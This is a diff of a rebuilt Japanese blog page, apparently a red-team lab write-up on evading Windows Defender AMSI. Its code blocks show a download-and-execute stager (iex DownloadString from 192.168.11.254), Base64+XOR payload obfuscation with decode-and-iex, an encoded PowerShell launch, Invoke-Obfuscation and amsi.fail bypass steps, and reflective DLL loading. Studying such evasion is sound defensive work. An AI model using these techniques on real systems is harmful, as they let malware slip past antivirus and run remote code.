@@ -2,7 +2,7 @@
 <html lang="ja-JP"><head>
 	<meta charset="utf-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-	<meta name="generator" content="Hugo 0.94.0-DEV" />
+	<meta name="generator" content="Hugo 0.120.4">
 	
 	<link rel="icon" href="/img/favicon.ico">
 	
@@ -109,10 +109,10 @@
 	<link href="https://fonts.googleapis.com/css?family=Righteous%7CMerriweather:300,300i,400,400i,700,700i" rel="stylesheet">
 
 	
-	<link rel="stylesheet" href="https://www.shutingrz.com/css/medium.ece05c3e0cb4c172303048d902f5c72734dac11b313a671c381a53648c811f4d.css" integrity="sha256-7OBcPgy0wXIwMEjZAvXHJzTawRsxOmccOBpTZIyBH00=">
+	<link rel="stylesheet" href="https://www.shutingrz.com/css/medium.a3d5489836b19de22a81ddc6bd21c17547d07529e67b266427378a04fa3ea727.css" integrity="sha256-o9VImDaxneIqgd3GvSHBdUfQdSnmeyZkJzeKBPo&#43;pyc=">
 
 	
-	<link rel="stylesheet" href="https://www.shutingrz.com/css/additional.70d2afaa4123a81a87361860935d957d9227f6cf5cb32557fd52a90ac69445fd.css" integrity="sha256-cNKvqkEjqBqHNhhgk12VfZIn9s9csyVX/VKpCsaURf0=">
+	<link rel="stylesheet" href="https://www.shutingrz.com/css/additional.f760d5a4187983370747b77f500be7e4986116f2bf360021cc71cefd77dcfec8.css" integrity="sha256-92DVpBh5gzcHR7d/UAvn5JhhFvK/NgAhzHHO/Xfc/sg=">
 
 	
 	
@@ -122,6 +122,7 @@
 	<link rel="stylesheet" href="/css/table.css" integrity="" crossorigin="anonymous" media="screen">
 	<link rel="stylesheet" href="/css/custom-font.css" integrity="" crossorigin="anonymous" media="screen">
 	<link rel="stylesheet" href="/css/accordion.css" integrity="" crossorigin="anonymous" media="screen">
+	<link rel="stylesheet" href="/css/web-embed.css" integrity="" crossorigin="anonymous" media="screen">
 	<link rel="alternate"
 	type="application/rss+xml"
 	href="https://www.shutingrz.com/index.xml"
@@ -316,8 +317,8 @@
   <img src="images/palauncher_amsi_detect.png" alt="palauncher_amsi_detect">
 </p>
 <p>検知され、実行に失敗しました。これは AMSI を通じて Windows Defender に検知されたことを示します。ただここで注目してほしいのは、<strong>検知されたポイントは DownloadString そのものではなく、ダウンロード後に展開された Stager コード部分である</strong>という点です。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">iex </span><span class="err">:</span> <span class="n">発生場所</span> <span class="n">行</span><span class="err">:</span><span class="n">1</span> <span class="n">文字</span><span class="err">:</span><span class="n">1</span>
-</span></span><span class="line"><span class="cl"><span class="p">+</span> <span class="nb">sv </span><span class="n">o</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">);</span><span class="nb">sv </span><span class="n">d</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">IO</span><span class="p">.</span><span class="n">Compression</span><span class="p">.</span><span class="n">Def</span> <span class="p">...</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">iex </span><span class="err">:</span> <span class="n">発生場所</span> <span class="n">行</span><span class="err">:</span><span class="mf">1</span> <span class="n">文字</span><span class="err">:</span><span class="mf">1</span>
+</span></span><span class="line"><span class="cl"><span class="p">+</span> <span class="nb">sv </span><span class="n">o</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">);</span><span class="nb">sv </span><span class="n">d</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">IO</span><span class="p">.</span><span class="py">Compression</span><span class="p">.</span><span class="py">Def</span> <span class="p">...</span>
 </span></span><span class="line"><span class="cl"><span class="p">+</span> <span class="p">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>
 </span></span><span class="line"><span class="cl"><span class="n">このスクリプトには</span><span class="err">、</span><span class="n">悪質なコンテンツが含まれているため</span><span class="err">、</span><span class="n">ウイルス対策ソフトウェアによりブロックされています</span><span class="err">。</span>
 </span></span></code></pre></div><p>つまり、初発の DownloadString で ps1 ファイルをダウンロードし iex で実行すること自体は、AMSIで検知されないということです。これは、外部からps1ファイルをダウンロードして実行するという行為が攻撃以外でも使われることがあるためです。これを利用する無害なソフトウェアの例として、Windows 上で動作するパッケージ管理ソフトウェア「chocolatey」のインストールスクリプトがあげられます。</p>
@@ -419,7 +420,7 @@ ret
 <p>難読化ツールを使わなくても AMSI を検知回避しつつ AMSI バイパスをするコードができました。（ただしクラウド保護はオフの状態で。）</p>
 <h3 id="pre-stagerの作成">Pre Stagerの作成</h3>
 <p>AMSI バイパスコードができあがったので、AMSIバイパスしたうえでStagerをダウンロードし実行する、「Pre Stager」を作成します。といっても、作成したAMSIバイパスコードの下に Stagerをダウンロードし実行するコードを追記するだけです。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">iex </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://192.168.11.254/ps_original.ps1&#39;</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">iex </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://192.168.11.254/ps_original.ps1&#39;</span><span class="p">)</span>
 </span></span></code></pre></div><p>しかし、ここでも注意点があります。</p>
 <h4 id="クラウド保護の動的シグネチャ作成に注意">クラウド保護の動的シグネチャ作成に注意</h4>
 <p>DownloadString + IEX の組み合わせはそれ自身ではアンチウイルスソフトには検知されませんが、一度 DownloadString でダウンロードしたファイルが AMSI によって検知された場合、Windows Defender は一定時間、該当ホストから DownloadString でダウンロードして iex を実行させるようなコードを全てブロックするような挙動を示します。</p>
@@ -441,15 +442,15 @@ ret
 <p>Base64 + XOR で暗号化するコードは以下です。0x64 は好きなバイトに、<code>&lt;paste here&gt;</code>は対象コードに変えてください。</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$key</span> <span class="p">=</span> <span class="n">0x64</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$str</span> <span class="p">=</span> <span class="s2">&#34;&lt;paste here&gt;&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$Bytes</span> <span class="p">=</span> <span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">Unicode</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$Bytes</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Text.Encoding</span><span class="p">]::</span><span class="n">Unicode</span><span class="p">.</span><span class="py">GetBytes</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$enc</span> <span class="p">=</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$byte</span> <span class="k">in</span> <span class="nv">$Bytes</span><span class="p">){</span><span class="nv">$byte</span> <span class="o">-bxor</span> <span class="nv">$key</span><span class="p">};</span>
-</span></span><span class="line"><span class="cl"><span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$enc</span><span class="p">)</span> <span class="p">|</span> <span class="n">clip</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">Convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$enc</span><span class="p">)</span> <span class="p">|</span> <span class="n">clip</span>
 </span></span></code></pre></div><p>なお復号コードとして以下を使います。</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$key</span> <span class="p">=</span> <span class="n">0x64</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$payload</span> <span class="p">=</span> <span class="s2">&#34;&lt;paste here&gt;&#34;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$Bytes</span> <span class="p">=</span> <span class="no">[Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$Bytes</span> <span class="p">=</span> <span class="p">[</span><span class="no">Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$payload</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$dec</span> <span class="p">=</span> <span class="k">foreach</span><span class="p">(</span><span class="nv">$byte</span> <span class="k">in</span> <span class="nv">$Bytes</span><span class="p">){</span><span class="nv">$byte</span> <span class="o">-bxor</span> <span class="nv">$key</span><span class="p">};</span>
-</span></span><span class="line"><span class="cl"><span class="nb">iex </span><span class="p">(</span><span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">Unicode</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$dec</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">iex </span><span class="p">([</span><span class="no">System.Text.Encoding</span><span class="p">]::</span><span class="n">Unicode</span><span class="p">.</span><span class="py">GetString</span><span class="p">(</span><span class="nv">$dec</span><span class="p">))</span>
 </span></span></code></pre></div><p>復号コードをAMSIバイパスコードの下に追記しファイルを保存。
 
   <img src="images/obfus_downloadstring.png" alt="obfus_downloadstring">
@@ -462,17 +463,17 @@ ret
 <p>Path を「/pre_stager.ps1」に設定し、作成したファイルをアップロードし準備完了です。</p>
 <h3 id="実行">実行</h3>
 <p>それでは改めてリアルタイムスキャンをオンの状態で（<strong>クラウド保護はオフ</strong>）、pre_stager.ps1 をダウンロードし実行するコードを実行しましょう。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">iex </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://192.168.11.254/pre_stager.ps1&#39;</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">iex </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://192.168.11.254/pre_stager.ps1&#39;</span><span class="p">)</span>
 </span></span></code></pre></div><p>この文字列を同じように Base64 + XOR で暗号化し、さらに復号 + IEX を行うコードを作成し、それをさらに Base64 エンコード化します（3重の構成）。</p>
 <p>なお Base64 エンコードするコードは以下です。</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$str</span> <span class="p">=</span> <span class="s1">&#39;&lt;paste here&gt;&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$Bytes</span> <span class="p">=</span> <span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">Unicode</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$Bytes</span><span class="p">)</span> <span class="p">|</span> <span class="n">clip</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$Bytes</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Text.Encoding</span><span class="p">]::</span><span class="n">Unicode</span><span class="p">.</span><span class="py">GetBytes</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">Convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$Bytes</span><span class="p">)</span> <span class="p">|</span> <span class="n">clip</span>
 </span></span></code></pre></div><blockquote>
 <p>PowerShell の -EncodedCommand オプションは UTF-16LE でエンコーディングされた文字でないと受け付けないので、他のプログラミング言語でエンコードする際は注意が必要です。</p>
 </blockquote>
 <p>出来上がった文字列で実行。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span> <span class="n">-sta</span> <span class="n">-nop</span> <span class="n">-ec</span> <span class="n">JABrAGUAeQAg</span><span class="p">(..</span><span class="n">snip</span><span class="p">..)</span><span class="n">ZABlAGMAKQApADsA</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span> <span class="n">-sta</span> <span class="n">-nop</span> <span class="n">-ec</span> <span class="n">JABrAGUAeQAg</span><span class="p">(..</span><span class="py">snip</span><span class="p">..)</span><span class="n">ZABlAGMAKQApADsA</span>
 </span></span></code></pre></div><p>
   <img src="images/win_but_no_cloud.png" alt="win_but_no_cloud">
 </p>
@@ -574,8 +575,8 @@ ret
 </p>
 <h4 id="2-b-string-難読化">2-b. string 難読化</h4>
 <p><code>Out-ObfuscatedStringCommand</code> を用いて pre_stager.ps1 を難読化します。出力ファイルは「pre_stager_enc.ps1」とします。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">&gt;</span> <span class="nb">Import-Module</span> <span class="p">.\</span><span class="nb">Invoke-Obfuscation</span><span class="p">.</span><span class="n">psd1</span>
-</span></span><span class="line"><span class="cl"><span class="p">&gt;</span> <span class="nb">Out-ObfuscatedStringCommand</span> <span class="n">-Path</span> <span class="n">pre_stager</span><span class="p">.</span><span class="n">ps1</span> <span class="p">&gt;</span> <span class="n">pre_stager_enc</span><span class="p">.</span><span class="n">ps1</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">&gt;</span> <span class="nb">Import-Module</span> <span class="p">.\</span><span class="nb">Invoke-Obfuscation</span><span class="p">.</span><span class="py">psd1</span>
+</span></span><span class="line"><span class="cl"><span class="p">&gt;</span> <span class="nb">Out-ObfuscatedStringCommand</span> <span class="n">-Path</span> <span class="n">pre_stager</span><span class="p">.</span><span class="py">ps1</span> <span class="p">&gt;</span> <span class="n">pre_stager_enc</span><span class="p">.</span><span class="py">ps1</span>
 </span></span></code></pre></div><h4 id="2-c-amsiinitfailed-コードの追加">2-c. amsiInitFailed コードの追加</h4>
 <p><a href="https://amsi.fail/">amsi.fail</a> にて難読化された amsiInitFailed バイパスコードを生成し、 pre_stager_enc.ps1 の1行目に追加します。</p>
 <h4 id="2-d-amsitrigger-で検知テスト">2-d. AMSITrigger で検知テスト</h4>
@@ -614,24 +615,24 @@ ret
   <img src="images/win32_cs.png" alt="win32_cs">
 </p>
 <p>次に csc.exe で csファイルをコンパイルし、win32.dll を作成します。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="p">&gt;</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">NET</span><span class="p">\</span><span class="n">Framework64</span><span class="p">\</span><span class="n">v4</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">30319</span><span class="p">\</span><span class="n">csc</span><span class="p">.</span><span class="n">exe</span> <span class="n">-target</span><span class="err">:</span><span class="n">library</span> <span class="n">win32</span><span class="p">.</span><span class="n">cs</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="p">&gt;</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">NET</span><span class="p">\</span><span class="n">Framework64</span><span class="p">\</span><span class="n">v4</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="mf">30319</span><span class="p">\</span><span class="n">csc</span><span class="p">.</span><span class="py">exe</span> <span class="n">-target:library</span> <span class="n">win32</span><span class="p">.</span><span class="py">cs</span>
 </span></span></code></pre></div><p>dll ファイルを Base64 化し、クリップボードにコピーします。</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="p">&gt;</span> <span class="nv">$filename</span> <span class="p">=</span><span class="s2">&#34;win32.dll&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="p">&gt;</span> <span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="no">[IO.File]</span><span class="p">::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span> <span class="p">|</span> <span class="n">clip</span>
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="p">&gt;</span> <span class="p">[</span><span class="no">Convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">([</span><span class="no">IO.File</span><span class="p">]::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="nv">$filename</span><span class="p">))</span> <span class="p">|</span> <span class="n">clip</span>
 </span></span></code></pre></div><p>これを Assembly.Load で正常に読み込まれるかチェックをしましょう。</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="p">&gt;</span> <span class="nv">$dat</span> <span class="p">=</span> <span class="s2">&#34;TVqQAAMAAA(..snip..)AAAAAAAAAAAAAAAAAAAAAAAA=&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="p">&gt;</span> <span class="no">[Reflection.Assembly]</span><span class="p">::</span><span class="n">Load</span><span class="p">(</span><span class="no">[Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$dat</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="p">&gt;</span> <span class="p">[</span><span class="no">Reflection.Assembly</span><span class="p">]::</span><span class="n">Load</span><span class="p">([</span><span class="no">Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$dat</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">GAC</span>    <span class="n">Version</span>        <span class="n">Location</span>
 </span></span><span class="line"><span class="cl"><span class="p">---</span>    <span class="p">-------</span>        <span class="p">--------</span>
-</span></span><span class="line"><span class="cl"><span class="n">False</span>  <span class="n">v4</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">30319</span>
+</span></span><span class="line"><span class="cl"><span class="n">False</span>  <span class="n">v4</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="py">30319</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="p">&gt;</span> <span class="no">[Win32]</span>
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="p">&gt;</span> <span class="p">[</span><span class="no">Win32</span><span class="p">]</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">IsPublic</span> <span class="n">IsSerial</span> <span class="n">Name</span>                                     <span class="n">BaseType</span>
 </span></span><span class="line"><span class="cl"><span class="p">--------</span> <span class="p">--------</span> <span class="p">----</span>                                     <span class="p">--------</span>
-</span></span><span class="line"><span class="cl"><span class="n">True</span>     <span class="n">False</span>    <span class="n">Win32</span>                                    <span class="n">System</span><span class="p">.</span><span class="n">Object</span>
+</span></span><span class="line"><span class="cl"><span class="n">True</span>     <span class="n">False</span>    <span class="n">Win32</span>                                    <span class="n">System</span><span class="p">.</span><span class="py">Object</span>
 </span></span></code></pre></div><p>正常に読み込まれることを確認したので、pre_stager.ps1 の該当箇所を置き換えます。</p>
 <p>
   <img src="images/win32_assembly.png" alt="win32_assembly">
@@ -729,7 +730,7 @@ ret
 <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
 
 
-<script src="https://www.shutingrz.com/js/mediumish.e4b90c58dfa15ac82caf2edfa01e5fd047e17bc15e6babe5c0e442a4407d0b25.js" integrity="sha256-5LkMWN&#43;hWsgsry7foB5f0Efhe8Fea6vlwORCpEB9CyU="></script>
+<script src="https://www.shutingrz.com/js/mediumish.84218587c174fd40bce82544b98851670f0b124a7324b349c54a4065e2b32ffc.js" integrity="sha256-hCGFh8F0/UC86CVEuYhRZw8LEkpzJLNJxUpAZeKzL/w="></script>
 <script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
